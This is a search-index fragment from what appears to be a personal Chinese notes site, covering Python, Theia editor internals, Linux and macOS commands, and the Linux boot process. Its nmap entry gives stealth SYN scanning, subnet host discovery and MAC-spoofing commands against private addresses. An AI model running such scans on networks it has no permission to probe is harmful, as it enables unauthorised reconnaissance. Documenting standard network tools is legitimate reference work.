</div>;\n}","tags":"前端","url":"/yq-docs-front-end-frame-theia-Technical-realization-Toolbar-more.html","loc":"/yq-docs-front-end-frame-theia-Technical-realization-Toolbar-more.html"},{"title":"Python中进制","text":"关键字 Python进制,\npython进制,\n进制转换,\n获取进制数 一般有三种: bin 二进制 oct 八进制 hex 十六进制 其中 八进制 0 开头 十六进制 0x 开头 转换 n进制转换为十进制，假设需要转换的位str的数字字符串: # str=001234; n=8\nprint int(str, n) 进制转换 python中约定了以为\n0b, 0o, 0x开头,\nb, o, x 的含义分别是: b - 二进制,Binary\no - 八进制,Octal\nx - 十六进制,Hexadecimal 在Python中对应方法为: 二进制: bin() 八进制: oct() 十六进制: hex() 转回十进制: int('0x16', 16) 举个例子: 0b10 # 二进制 10, 相当于十进制 2\n0o10 # 八进制 10, 相当于十进制 8\n0x10 # 十六进制 10, 相当于十进制 16 例: In [6]: '十进制', 22\nOut[6]: ('十进制', 22)\n\nIn [7]: '二进制', bin(22)\nOut[7]: ('二进制', '0b10110')\n\nIn [8]: '八进制', oct(22)\nOut[8]: ('八进制', '0o26')\n\nIn [9]: '十六进制', hex(22)\nOut[9]: ('十六进制', '0x16')\n\nIn [11]: int('0x16', 16), '十六进制转十进制'\nOut[11]: (22, '十六进制转十进制')","tags":"后端; python","url":"/yq-docs-rear-end-python-Concept-Python-midfielder.html","loc":"/yq-docs-rear-end-python-Concept-Python-midfielder.html"},{"title":"nmap","text":"Network Mapper, Linux下的网络扫描和嗅探工具包(比如IP/端口扫描) 用法: nmap [Scan Type(s)] [Options] {target specification} target可以是单一 IP, 或主机名，或域名，或子网 选项参数 --interactive 打开交互模式 -v 输出详细信息 -O 尝试识别远程操作系统 -s S TCP SYN 扫描 (又称半开放,或隐身扫描) -s V 打开系统版本检测 -A 同时打开操作系统指纹和版本检测 -s n , -s P 不扫描端口, 发送imcp和一个TCP报文到80端口 其他: -P0\n        允许你关闭 ICMP pings.\n-Pn\n        无ping, 跳过主机发现阶段，把每个都IP当成存活主机\n-P0 <协议号列表>\n        IP 协议 ping,\n-sT\n        TCP connect()扫描\n-sU\n        UDP 扫描 示例 扫描局域网主机: nmap -sP 192.168.1.0/24 扫描主机端口: nmap -sT 192.168.1.101\n# 貌似其他非Kali机器自行安装的得 nmap -sT -Pn 192.168.1.101 匿名扫描: nmap -sS 192.168.1.101 ┌── ( yanque㉿kali ) - [ ~ ] └─$ nmap 192 .168.179.129\nStarting Nmap 7 .93 ( https://nmap.org ) at 2023 -01-02 17 :24 CST\nNmap scan report for 192 .168.179.129\nHost is up ( 0 .000042s latency ) .\nNot shown: 999 closed tcp ports ( conn-refused ) PORT STATE SERVICE 22 /tcp open ssh\n\nNmap done : 1 IP address ( 1 host up ) scanned in 0 .09 seconds\n\n┌── ( yanque㉿kali ) - [ ~ ] └─$ 查看 192.168.179.129 的 22 端口状态: ┌──(yanque㉿3675b5ebb8ce)-[~/test]\n└─$ nmap -p22 192.168.179.129\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-02-25 06:48 UTC\nNote: Host seems down. If it is really up, but blocking our ping probes, try -Pn\nNmap done: 1 IP address (0 hosts up) scanned in 3.06 seconds 伪装MAC地址11:11:11:11:11:11 ┌──(yanque㉿3675b5ebb8ce)-[~/test]\n└─$ nmap --spoof-mac 11:11:11:11:11:11 192.168.100.1 -Pn -p 80\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-02-25 07:35 UTC\nSpoofing MAC address 11:11:11:11:11:11 (Private)\nYou have specified some options that require raw socket access.\nThese options will not be honored without the necessary privileges.\nNmap scan report for 192.168.100.1\nHost is up.\n\nPORT   STATE    SERVICE\n80/tcp filtered http\n\nNmap done: 1 IP address (1 host up) scanned in 2.14 seconds","tags":"安全","url":"/yq-docs-Safety-kali-Kali-penetration-special-instruction-nmap.html","loc":"/yq-docs-Safety-kali-Kali-penetration-special-instruction-nmap.html"},{"title":"编辑器打开并滑动","text":"主要基于的情况: 代码跳转到指定文件的指定位置 入口位置: node_modules/@theia/monaco-editor-core/src/vs/editor/contrib/gotoSymbol/browser/goToCommands.ts 下的 SymbolNavigationAction 类 runEditorCommand ,\n关键打开实际触发的 _openReference 实例方法, 关键代码: const targetEditor = await editorService.openCodeEditor({\n      resource: reference.uri,\n      options: {\n        selection: Range.collapseToStart(range),\n        selectionRevealType: TextEditorSelectionRevealType.NearTopIfOutsideViewport,\n        selectionSource: TextEditorSelectionSource.JUMP\n      }\n    }, editor, sideBySide); 这里调用 editorService.openCodeEditor , 定义在 node_modules/@theia/monaco/src/browser/monaco-editor-service.ts 下的 MonacoEditorService 服务, openCodeEditor 关键代码: override async openCodeEditor(input: IResourceEditorInput, source: ICodeEditor | null, sideBySide?: boolean): Promise<ICodeEditor | null> {\n  const uri = new URI(input.resource.toString());\n  const openerOptions = this.createEditorOpenerOptions(input, source, sideBySide);\n  const widget = await open(this.openerService, uri, openerOptions);\n  ...\n} 主要是 open ,  定义在 node_modules/@theia/core/src/browser/opener-service.ts export async function open(openerService: OpenerService, uri: URI, options?: OpenerOptions): Promise<object | undefined> {\n  const opener = await openerService.getOpener(uri, options);\n  return opener.open(uri, options);\n} 这里又回转到 node_modules/@theia/editor/src/browser/editor-manager.ts 下 EditorManager 服务的: override open(uri: URI, options?: EditorOpenerOptions): Promise<EditorWidget> {\n  ...\n\n    return super.open(uri, { counter, ...options });\n\n  ... 这里super触发的是 node_modules/@theia/core/src/browser/widget-open-handler.ts 下的 WidgetOpenHandler 服务的 async open(uri: URI, options?: WidgetOpenerOptions): Promise<W> {\n  const widget = await this.getOrCreateWidget(uri, options);\n  await this.doOpen(widget, options);\n  return widget;\n} 但是实际上是被 node_modules/@theia/editor-preview/src/browser/editor-preview-manager.ts 重写的 EditorPreviewManager 触发 tryGetPendingWidget : protected override tryGetPendingWidget(uri: URI, options?: EditorOpenerOptions): MaybePromise<EditorWidget> | undefined {\n  return super.tryGetPendingWidget(uri, { ...options, preview: true }) ?? super.tryGetPendingWidget(uri, { ...options, preview: false });\n} 再看super的定义: protected override tryGetPendingWidget(uri: URI, options?: EditorOpenerOptions): MaybePromise<EditorWidget> | undefined {\n    const editorPromise = super.tryGetPendingWidget(uri, options);\n    if (editorPromise) {\n        // Reveal selection before attachment to manage nav stack. (https://github.com/eclipse-theia/theia/issues/8955)\n        if (!(editorPromise instanceof Widget)) {\n            editorPromise.then(editor => this.revealSelection(editor, options, uri));\n        } else {\n            this.revealSelection(editorPromise, options);\n        }\n    }\n    return editorPromise;\n} editorPromise 那一步其实就可以算页面已经在后台创建好了, 只是还没显示出来而已. 接着重点就是调用 revealSelection 来将光标移动道指定的位置, 关键调用代码: if (inputSelection) {\n    const editor = widget.editor;\n    const selection = this.getSelection(widget, inputSelection);\n    if (Position.is(selection)) {\n        editor.cursor = selection;\n        editor.revealPosition(selection);\n    } else if (Range.is(selection)) {\n        editor.cursor = selection.end;\n        editor.selection = selection;\n        editor.revealRange(selection);\n    }\n} 代码跳转触发的是 revealRange ,\n这期间简单的调用打断点向下看就是了, 大致顺序: node_modules/@theia/monaco/src/browser/monaco-editor.ts 下 MonacoEditor().revealRange ,\n接下来以调用 revealRangeInCenter 为例 node_modules/@theia/monaco-editor-core/src/vs/editor/browser/widget/codeEditorWidget.ts , CodeEditorWidget().revealRangeInCenter 在这个类中最终触发: this._modelData.viewModel.revealRange('api', revealHorizontal, viewRange, verticalType, scrollType); 它的 _withViewEventsCollector 会将事件放到一个集合然后统一触发.\n稍微复杂的就是这个位置, 写的有点绕. 集合统一处理的位置: node_modules/@theia/monaco-editor-core/src/vs/editor/common/viewEventHandler.ts 下的 ViewEventHandler().handleEvents ,\n关键代码: case viewEvents.ViewEventType.ViewRevealRangeRequest:\n  if (this.onRevealRangeRequest(e)) {\n    shouldRender = true;\n  }\n  break; 这里 onRevealRangeRequest 触发的相关位置为 node_modules/@theia/monaco-editor-core/src/vs/editor/browser/viewParts/lines/viewLines.ts 的 ViewLines().onRevealRangeRequest : const scrollTopDelta = Math.abs(this._context.viewLayout.getCurrentScrollTop() - newScrollPosition.scrollTop);\nconst scrollType = (scrollTopDelta <= this._lineHeight ? ScrollType.Immediate : e.scrollType);\nthis._context.viewModel.viewLayout.setScrollPosition(newScrollPosition, scrollType);","tags":"前端","url":"/yq-docs-front-end-frame-theia-Technical-realization-Editor-opens-and-slides.html","loc":"/yq-docs-front-end-frame-theia-Technical-realization-Editor-opens-and-slides.html"},{"title":"net","text":"查看已经挂载/打开的网络地址 (指磁盘, ftp服务器啥的): net use 删除上面列举出所有挂载的磁盘/服务器: net use /delete * 删除 z 盘映射: net use z: /delete 挂载samba共享为z盘: net use z:\\\\192.168.1.1\\USB_discl /user:usernane passwd","tags":"操作系统","url":"/yq-docs-operating-system-Windows-windows_shell-net.html","loc":"/yq-docs-operating-system-Windows-windows_shell-net.html"},{"title":"iStoreOS","text":"一个基于 index 的定制系统 官网: https://www.istoreos.com 官网文档: https://doc.linkease.com/zh/guide/istoreos/ github主页: https://github.com/istoreos 支持(源于官网) StoreOS 固件 iStoreOS 目标是提供一个人人会用的路由兼轻 NAS 系统，不管是作为路由还是 NAS，你都有相似的操作体验。 系统本身开源免费，目前系统代码开源在：Github iStoreOS iStoreOS 来源于 OpenWRT，相较于原版 OpenWRT，iStoreOS 具有以下优势： iStoreOS 提供了软件中心：iStore，尽可能解决插件之间的依赖关系，可让大家自由自在安装插件。手动安装离线包也是支持的。 iStoreOS 固件升级时会保留用户安装的插件，避免升级以后还要再安装一遍插件。 iStoreOS 官方支持的硬件都可以在线升级，无需手动下载固件升级。 iStoreOS 拥有沙箱模式。通过 U 盘进入沙箱模式，后续的软件安装更新以及系统配置都在沙箱进行。不管安装插件搞坏了系统还是配置错误导致系统故障，拔掉 U 盘就回到进沙箱前的状态。如果对当前状态满意还可以回写到非沙箱环境。沙箱模式本身也是系统扩容的最简单的方法。 救援模式，即使固件损坏，也可以进入救援模式刷机或恢复出厂设置。目前仅仅自家硬件 ARS2 支持 支持三种不同UI iStoreOS 入门极客版本 UI 是默认的 UI，目标是提供给懂点技术的入门极客爱好者，或者偷懒极客老手，核心特性： 首页提供网络向导，磁盘向导，Docker 向导等等众多向导，不管是新手还是老手，都能快速配置自己想要的东西 修复众多 OpenWRT 不人性的小问题，比如 Samba 设置独立用户名密码很麻烦，磁盘挂载等 更多首页工具好帮手，比如在线升级，各种错误检测，网口图形化配置等 其它很多常用的，比如 DDNS 配置，Docker 配置等 最标准的小白路由版本 减去了超多的复杂的眼花缭乱的功能，回归最本质的路由功能。 对于路由器硬件卖家来说，最好默认帮用户安装此版本。 安装方法 在默认的极客版本上，从软件中心，安装 iStoreX\n退出重新登录，就到了小白路由器版本 轻 NAS 版本 如果你不是重度的BT下载用户，也不是重度在线看电影需要视频硬解码的用户，\n那么用个软路由当NAS，是完全没问题的。毕竟网络转发跟硬盘存储不冲突。 当然，iStoreOS 也会提供给你一个纯正独立的 NAS 系统，底层也完全是 OpenWRT，\n且软件中心完全互通，你懂的路由器的知识，也可以完全搬到 NAS 系统上。那么我们的 NAS 系统有哪些功能？ RAID 磁盘阵列 S.M.A.R.T 检测 个人私有网盘，借助易有云插件 实现 相册自动备份，借助易有云插件 实现 异地多设备文件同步，借助易有云插件 实现 异地组网，借助易有云插件 实现 远程域名访问，借助DDNSTO插件 实现 软件中心（当然软件中心有 NasTool、Jellyfin 影院、下载等等） 注意：目前此交互还在活跃开发中 固件下载 下载地址 https://fw.koolcenter.com/iStoreOS/ 使用方法 默认IP: http://192.168.100.1 默认密码: password 如果只有一个网口，默认的网口是 LAN；\n如果大于一个网口，默认 eth0 是 WAN 口，其它都是 LAN。 如果在 LAN 口修改 IP，或者任何修改之后导致无法连接路由器，都会导致刚才的修改被回滚。\n所以要修改 LAN/WAN 口 IP，可以选择强制应用，保证修改肯定生效。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Istoreos-index.html","loc":"/yq-docs-operating-system-linux-Istoreos-index.html"},{"title":"ping","text":"主要透过 icmp 封包 探索网络.\n属于网络层的ICMP协议，只能检查 IP 的连通性或网络连接速度， 无法检测IP的端口状态。 可以测试主机之间网络的连通性 -c 数值 表示执行ping的次数 -n 不进行ip与主机名的反查，直接用ip输出（速度较快） -s 数值 发出去的 icmp 封包大小，预设为56bytes -t 数值 TTL的数值，预设是255，每经过一个节点就减一 -W 数值 等待响应对方主机的秒数 -M [do|dont] 主要在侦测网络的MTU数值大小 do 代表传送一个 DF（Dont Fragment）旗标，让封包不能重新拆包与打包 dont 代表不要传送 DF标志，表示封包可以在其他主机封包、打包 若不存在: apt-get install iputils-ping","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-flat.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-flat.html"},{"title":"tcping","text":"与 ping 和 telnet 都不同,\n是一款跨平台的基于Go的, tcp链接检查工具.\n使用传输层协议，可以检测IP端口状态和查看ping 值，\n即使源地址禁 ping 也可以通过 tcping 来监控服务器网络状态。 Windows下载: https://elifulkerson.com/projects/tcping.php MacOS安装: brew install tcping 注解 看了下, 貌似最开始只有win版, 不知道啥写的, 然后是后面才有人用Go根据这个写的其他平台的版本,\n目前排名最高的两个: https://github.com/cloverstd/tcping\n\n# 这个更新勤点\nhttps://github.com/pouriyajamshidi/tcping MacOS下看了下, 用的是收藏量不高的: brew info tcping\n==> tcping: stable 2.1.0 (bottled), HEAD\nTCP connect to the given IP/port combo\nhttps://github.com/mkirchner/tcping\n/usr/local/Cellar/tcping/2.1.0 (5 files, 39.4KB) *\n  Poured from bottle using the formulae.brew.sh API on 2024-03-04 at 10:07:05\nFrom: https://github.com/Homebrew/homebrew-core/blob/HEAD/Formula/t/tcping.rb\nLicense: MIT 用法: tcping [-q] [-f <4|6>] [-t timeout_sec] [-u timeout_usec] <host> <port> 举例: ### 默认端口为80\ntcping google.com\n\n### 带上80端口\ntcping google.com 80\n\n### 带上443端口\ntcping google.com 443\n\n### 多个端口\ntcping google.com 80 443\n\n### 连续的端口\ntcping google.com 80-85\n\n### 多个连续的端口\ntcping google.com 80-83 443-445\n\n### IPV6 地址\ntcping [::1]","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-tcping.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-tcping.html"},{"title":"telnet","text":"登录远程主机和管理(也可以简单测试ip端口是否连通).\n属于应用层的协议，可用于远程登录，也可用于检测IP的端口状态 注解 一般登陆成功就与目标主机端口建立链接了,\n也可以用来作为一个简单的client测试server 语法: telnet [host|ip [port]]","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-telnet.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-telnet.html"},{"title":"map","text":"map(fun, iter) 第一个参数为函数， 第二个参数为迭代器，表示对每一个迭代器的元素做fun操作 当iter为list时， map(fun, iter) 等价于 [fun(x) for x in iter]","tags":"后端; python","url":"/yq-docs-rear-end-python-Built--in-function-map.html","loc":"/yq-docs-rear-end-python-Built--in-function-map.html"},{"title":"图标制作","text":"使用 sips 例, 有一个1024*1024的png: pic.png: mkdir tmp.iconset\n\n# 命令格式：sips -z 新图片宽度 新图片高度 原图片名 --out 临时.iconset/新图片完整名\n\nsips -z 16 16 pic.png --out tmp.iconset/icon_16x16.png\nsips -z 32 32 pic.png --out tmp.iconset/icon_16x16@2x.png\nsips -z 32 32 pic.png --out tmp.iconset/icon_32x32.png\nsips -z 64 64 pic.png --out tmp.iconset/icon_32x32@2x.png\nsips -z 128 128 pic.png --out tmp.iconset/icon_128x128.png\nsips -z 256 256 pic.png --out tmp.iconset/icon_128x128@2x.png\nsips -z 256 256 pic.png --out tmp.iconset/icon_256x256.png\nsips -z 512 512 pic.png --out tmp.iconset/icon_256x256@2x.png\nsips -z 512 512 pic.png --out tmp.iconset/icon_512x512.png\nsips -z 1024 1024 pic.png --out tmp.iconset/icon_512x512@2x.png 还可参考: https://blog.csdn.net/ypf1024/article/details/114011755","tags":"操作系统","url":"/yq-docs-operating-system-Mac-Icon-making.html","loc":"/yq-docs-operating-system-Mac-Icon-making.html"},{"title":"sips","text":"sips, 图像处理脚本(scriptable image processing system),\n支持进行图片的格式转换, 以及图片的裁剪旋转等各种常用操作.\n是MacOS自带的图片处理命令, 功能强大. 质量高,pdf转png会丢失背景,且不能处理ico文件 注解 有个更简单的只能转换类型的 convert ,\n不过清晰度不高. 图像处理脚本(scriptable image processing system): This tool is used to query or modify raster image files and ColorSync ICC profiles.\nIts functionality can also be used through the \"Image Events\" AppleScript suite. 命令格式简洁版(下面太长): sips -z 新图片宽度 新图片高度 原图片名 --out 临时.iconset/新图片完整名 Usages: sips [image-functions] imagefile ...\nsips [profile-functions] profile ... Profile query functions: -g, --getProperty key\n-X, --extractTag tag tagFile\n    --verify\n-1, --oneLine Image query functions: -g, --getProperty key\n-x, --extractProfile profile\n-1, --oneLine Profile modification functions: -s, --setProperty key value\n-d, --deleteProperty key\n    --deleteTag tag\n    --copyTag srcTag dstTag\n    --loadTag tag tagFile\n    --repair\n-o, --out file-or-directory Image modification functions:: -s, --setProperty key value\n-d, --deleteProperty key\n-e, --embedProfile profile\n-E, --embedProfileIfNone profile\n-m, --matchTo profile\n-M, --matchToWithIntent profile intent\n    --deleteColorManagementProperties\n-r, --rotate degreesCW\n-f, --flip horizontal|vertical\n-c, --cropToHeightWidth pixelsH pixelsW\n    --cropOffset offsetY offsetH\n-p, --padToHeightWidth pixelsH pixelsW\n    --padColor hexcolor\n-z, --resampleHeightWidth pixelsH pixelsW     裁剪图片, 指定宽度、高度\n    --resampleWidth pixelsW                   裁剪图片, 指定宽度\n    --resampleHeight pixelsH                  裁剪图片, 指定高度\n-Z, --resampleHeightWidthMax pixelsWH         裁剪图片, 指定宽度(高度自适应)\n-i, --addIcon\n    --optimizeColorForSharing\n-o, --out file-or-directory\n-j, --js file Other functions: --debug           Enable debugging output\n-h, --help            Show help\n-H, --helpProperties  所有键值参数(Show help for properties)\n    --man             Generate man pages\n-v, --version         Show the version\n    --formats         列出支持的格式(Show the read/write formats) 用例 图片格式转换 pdf->png: sips -s format png old.pdf -o new.png pdf->jpg: sips -s format jpeg old.pdf -o new.jpg jpg->gif: sips -s format gif old.jpg -o new.gif 注解 ico格式(图标)不能通过sips实现, 只能通过imagemagick来操作. 修改图片为指定像素 修改图片为20000像素宽, 高度为自适应(Z大写): sips -Z 20000 a.jpg 修改图片为200*200像素: sips -z 200 200 a.jpg 旋转/翻转图片 顺时针旋转图片180°: sips -r 180 a.jpg 水平/垂直翻转图片: sips -f horizontal  a.jpg\nsips -f vertical  a.jpg","tags":"操作系统","url":"/yq-docs-operating-system-Mac-MAC-instruction-SIPS.html","loc":"/yq-docs-operating-system-Mac-MAC-instruction-SIPS.html"},{"title":"elf文件","text":"参考: https://zhuanlan.zhihu.com/p/59590848 https://zhuanlan.zhihu.com/p/112754720 Linux 上可执行程序遵循的是 ELF（Executable and Linking Format）格式,\n是一个定义了目标文件内部信息如何组成和组织的文件格式。\n内核会根据这些信息加载可执行文件，内核根据这些信息可以知道从文件哪里获取代码，\n从哪里获取初始化数据，在哪里应该加载共享库，等信息。 分类 .o目标文件\n由: gcc -c test.c 得到的test.o就是目标文件，目标文件通过链接可生成可执行文件。\n静态库其实也算目标文件，静态库是通过ar命令将目标打包为.a文件。\n如: ar crv libtest.a test.o 可执行文件\n可由: gcc -o test test.c 生成 .so共享库\n可由生成: gcc test.c -fPIC -shared -o libtest.so 可以通过 readelf 来区分上面三种类型的ELF文件","tags":"操作系统","url":"/yq-docs-operating-system-linux-Conceptual-ELF-file.html","loc":"/yq-docs-operating-system-linux-Conceptual-ELF-file.html"},{"title":"IO模型","text":"epoll 好处 epoll是单线程, 基于回调; 减少多线程切换的开销 epoll_create 函数: int epoll_create(int size); 关于更多信息, 可以通过查看: man epoll_create 注解 文件描述符（file descriptor），\nLinux内核为高效管理已被打开的\"文件\"所创建的索引，用该索引可以找到文件 epoll_ctl 对于指定的文件描述符epfd引用的epoll实例,\n监听相关事件event 函数: int epoll_ctl (int epfd, int op, int fd, struct epoll_event *event); op EPOLL_CTL_ADD： 注册新的fd到epfd中，并关联事件event； EPOLL_CTL_MOD：修改已经注册的fd的监听事件； EPOLL_CTL_DEL：从epfd中移除fd，并且忽略掉绑定的event，这时event可以为null; events 有很多可选值，这里只举例最常见的几个 EPOLLIN ：表示对应的文件描述符是可读的； EPOLLOUT：表示对应的文件描述符是可写的； EPOLLERR：表示对应的文件描述符发生了错误； 成功则返回0，失败返回-1 epoll_wait 等待 epoll_ctl 的事件 当socket收到数据后，\n操作系統的中断程序调用回调函数会给epoll实例的\n事件就緒列表rdlist里添加该socket引用（这块是操作系统实现的），\n当程序执行到epoll_wait 时，如果rdllist已经引用了socket，\n那么 epoll_wait 直接返回，如果rdllist为空，阻塞进程 rdllist 就绪事件列表 再底层就是操作系统的 ** 中断** 实现","tags":"操作系统","url":"/yq-docs-operating-system-linux-Conceptual-IO-model.html","loc":"/yq-docs-operating-system-linux-Conceptual-IO-model.html"},{"title":"linux删除机制","text":"linux下文件是否真实存在可以通过硬连接判断 只要该文件硬连接数量大于等于1, 那么它就真实存在(数量就是有多少份而已) 而删除的时候, 需要保证两种链接的数量都为0, 才能真正删除: i_count, 被调用计数(可以理解为内存的引用计数器) i_nlink, 硬链接计数 使用rm删除一个文件时, 只是将i_nlink的数目减1,\n但是若在此之前存在调用且未结束时, rm可以成功执行, 但是并不会真正从磁盘删除(因为i_count不为0) 如果要在这个时候找回被删除的文件, 停下其他的磁盘写入进程(防止对应的数据区块被覆盖), 然后找到当前这个被删除的文件就行\n可以使用 lsof 或者直接去 /proc下找即可.\n如: lsof | grep deleted 注解 检查link的办法: ls -ihl 检查i_count的办法(-u指在每个进程后显现所属的用户名，-v指详细形式): fuser -uv [绝对路径文件名]","tags":"操作系统","url":"/yq-docs-operating-system-linux-Conceptual-Linux-deletion-mechanism.html","loc":"/yq-docs-operating-system-linux-Conceptual-Linux-deletion-mechanism.html"},{"title":"sudo与su的部分说明","text":"su <user>: 切换到指定的user, 输出这个user的密码. 可以加 - 指定切换到user的环境. sudo <cmd>: 以root的身份执行指令, 还是使用当前用户的环境, 可以使用 -u 指定其他用户 sudo su: 切换到root, 保留最初的用户环境 sudo su -: 切换到root, 同时存在最初的用户的环境与root的用户环境, 如果冲突, 以root为准","tags":"操作系统","url":"/yq-docs-operating-system-linux-Conceptual-Part-of-the-SUDO-and-SU-explanation.html","loc":"/yq-docs-operating-system-linux-Conceptual-Part-of-the-SUDO-and-SU-explanation.html"},{"title":"指令export、env、set三者的区别","text":"export、env、set三者的区别 注解 echo $PATH  #输出当前环境变量\nlocale   #设置系统语言环境 set 用来显示本地变量 set env 用来显示环境变量 env export 用来显示和设置环境变量 export shell变量 shell变量包括两种变量 本shell私有的变量：通过赋值语句定义好的变量，可以通过如下方法定义shell变量: A1=\"1234\"\ndelcare A2=\"2345\" 用户的环境变量：通过export语法导出的shell私有变量，可以通过如下方法导出用户环境变量: A1=\"1234\"\nexport A1  #先定义再导出\nexport A3=\"34\" 导出成的用户环境变量可以在所有的shell中看到 总结 set 显示当前shell的定义的私有变量，包括当前用户的环境变量，按变量名称排序； env 显示当前用户的变量 export 显示当前导出成用户变量的shell变量，并显示变量的属性(是否只读)，按变量名称排序； declare 同set 一样，显示当前shell的定义的变量，包括用户的环境变量。 每个shell有自己特有的变量（set）显示的变量，这个和用户变量是不同的，\n当前用户变量和你用什么shell无关，不管你用什么shell都在，\n比如HOME,SHELL等这些变量，但shell自己的变量不同shell是不同的，比\n如BASH_ARGC， BASH等，这些变量只有set才会显示，是bash特有的，\nexport不加参数的时候，显示哪些变量被导出成了用户变量，\n因为一个shell自己的变量可以通过export \"导出\"变成一个用户变量。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Conceptual-The-difference-between-instructions-Export,-ENV,-SET.html","loc":"/yq-docs-operating-system-linux-Conceptual-The-difference-between-instructions-Export,-ENV,-SET.html"},{"title":"Linux系统的启动过程","text":"菜鸟的 Linux 系统启动过程 的解释还不错 涉及到指令: init shutdown runlevel halt poweroff reboot Linux系统的启动过程大致阶段: 内核的引导(/boot) 运行 init 系统初始化 建立终端 用户登录系统 init 常用机制: SysV: init, 如CentOS 5之前, 配置文件： /etc/inittab Upstart: init, 如CentOS 6, 配置文件： /etc/inittab, /etc/init/*.conf Systemd： systemd, 如CentOS 7,配置文件： /usr/lib/systemd/system、 /etc/systemd/system。 注解 配置文件可记录默认的 运行级别 内核引导 当计算机打开电源后，首先是BIOS开机自检，按照BIOS中设置的启动设备（通常是硬盘）来启动。\n操作系统接管硬件以后，首先读入 /boot 目录下的内核文件。 运行init init 进程是系统所有进程的起点，可以把它比拟成系统所有进程的老祖宗，没有这个进程，系统中任何进程都不会启动。\ninit 程序首先是需要读取配置文件 /etc/inittab(根据使用机制的不同读取不通的配置文件, 比如Ubuntu使用的是Upstart机制,\n相关配置文件为/etc/init/rc-sysinit.conf) 运行级别 许多程序需要开机启动。它们在Windows叫做\"服务\"（service），在Linux就叫做\"守护进程\"（daemon）。\ninit进程的一大任务，就是去运行这些开机启动的程序。\n但是，不同的场合需要启动不同的程序，比如用作服务器时，需要启动Apache，用作桌面就不需要。\nLinux允许为不同的场合，分配不同的开机启动程序，这就叫做\"运行级别\"（runlevel）。也就是说，启动时根据\"运行级别\"，确定要运行哪些程序。 查看当前运行级别可使用 runlevel Linux系统有7个运行级别(runlevel), 也就是init指令支持的参数： 运行级别0：系统停机状态，系统默认运行级别不能设为0，否则不能正常启动 运行级别1：单用户工作状态，root权限，用于系统维护，禁止远程登录 运行级别2：多用户状态(没有NFS) 运行级别3：完全的多用户状态(有NFS)，登录后进入控制台命令行模式 运行级别4：系统未使用，保留 运行级别5：X11控制台，登录后进入图形GUI模式 运行级别6：系统正常关闭并重启，默认运行级别不能设为6，否则不能正常启动 系统初始化 在init的配置文件中有这么一行: si::sysinit:/etc/rc.d/rc.sysinit 它调用执行了/etc/rc.d/rc.sysinit，而rc.sysinit是一个bash shell的脚本，\n它主要是完成一些系统初始化的工作，rc.sysinit是每一个运行级别都要首先运行的重要脚本。\n它主要完成的工作有: 激活交换分区 检查磁盘 加载硬件模块 一些需要优先执行任务。 如下面的内容: l5:5:wait:/etc/rc.d/rc 5 表示以5为参数运行/etc/rc.d/rc，/etc/rc.d/rc是一个Shell脚本，它接受5作为参数，\n去执行/etc/rc.d/rc5.d/目录下的所有的rc启动脚本，/etc/rc.d/rc5.d/目录中的这些启动脚本实际上都是一些连接文件，\n而不是真正的rc启动脚本，真正的rc启动脚本实际上都是放在/etc/rc.d/init.d/目录下。 而这些rc启动脚本有着类似的用法，它们一般能接受start、stop、restart、status等参数。\n/etc/rc.d/rc5.d/中的rc启动脚本通常是K或S开头的连接文件，对于以 S 开头的启动脚本，将以start参数来运行。\n而如果发现存在相应的脚本也存在K打头的连接，而且已经处于运行态了(以/var/lock/subsys/下的文件作为标志)，\n则将首先以stop为参数停止这些已经启动了的守护进程，然后再重新运行。 这样做是为了保证是当init改变运行级别时，所有相关的守护进程都将重启。\n至于在每个运行级中将运行哪些守护进程，用户可以通过chkconfig或setup中的\"System Services\"来自行设定。 建立终端 rc执行完毕后，返回init。这时基本系统环境已经设置好了，各种守护进程也已经启动了。\ninit接下来会打开6个终端，以便用户登录系统。在inittab中的以下6行就是定义了6个终端: 1:2345:respawn:/sbin/mingetty tty1\n2:2345:respawn:/sbin/mingetty tty2\n3:2345:respawn:/sbin/mingetty tty3\n4:2345:respawn:/sbin/mingetty tty4\n5:2345:respawn:/sbin/mingetty tty5\n6:2345:respawn:/sbin/mingetty tty6 从上面可以看出在2、3、4、5的运行级别中都将以respawn方式运行mingetty程序，mingetty程序能打开终端、设置模式。\n同时它会显示一个文本登录界面，这个界面就是我们经常看到的登录界面，在这个登录界面中会提示用户输入用户名，\n而用户输入的用户将作为参数传给login程序来验证用户的身份。 用户登录系统 一般来说，用户的登录方式有三种： 命令行登录 ssh登录 图形界面登录 对于运行级别为5的图形方式用户来说，他们的登录是通过一个图形化的登录界面。登录成功后可以直接进入 KDE、Gnome 等窗口管理器。\n而本文主要讲的还是文本方式登录的情况：当我们看到mingetty的登录界面时，我们就可以输入用户名和密码来登录系统了。\nLinux 的账号验证程序是 login，login 会接收 mingetty 传来的用户名作为用户名参数。 然后 login 会对用户名进行分析：如果用户名不是 root，且存在 /etc/nologin 文件，login 将输出 nologin 文件的内容，然后退出。\n这通常用来系统维护时防止非root用户登录。只有/etc/securetty中登记了的终端才允许 root 用户登录，如果不存在这个文件，\n则 root 用户可以在任何终端上登录。\n/etc/usertty文件用于对用户作出附加访问限制，如果不存在这个文件，则没有其他限制。 图形模式与文字模式的切换方式 Linux预设提供了六个命令窗口终端机让我们来登录。 默认我们登录的就是第一个窗口，也就是tty1，这个六个窗口分别为tty1,tty2 … tty6，即 建立终端 部分介绍的六个终端\n你可以按下Ctrl + Alt + F1 ~ F6 来切换它们。 如果你安装了图形界面，默认情况下是进入图形界面的，此时你就可以按Ctrl + Alt + F1 ~ F6来进入其中一个命令窗口界面。\n当你进入命令窗口界面后再返回图形界面只要按下Ctrl + Alt + F7 就回来了。 如果你用的 vmware 虚拟机 ，命令窗口切换的快捷键为 Alt + Space + F1~F6.\n如果你在图形界面下请按Alt + Shift + Ctrl + F1~F6 切换至命令窗口。 Linux启动加载顺序图例 Linux 关机 在linux领域内大多用在服务器上，很少遇到关机的操作。毕竟服务器上跑一个服务是永无止境的，除非特殊情况下，不得已才会关机。\n正确的关机流程为: sync > shutdown > reboot > halt 关机可使用的指令: init 0\nshutdown –h now\nhalt\npoweroff 重启可使用的指令: shutdown –r now\nreboot\ninit 6 关机指令为：shutdown 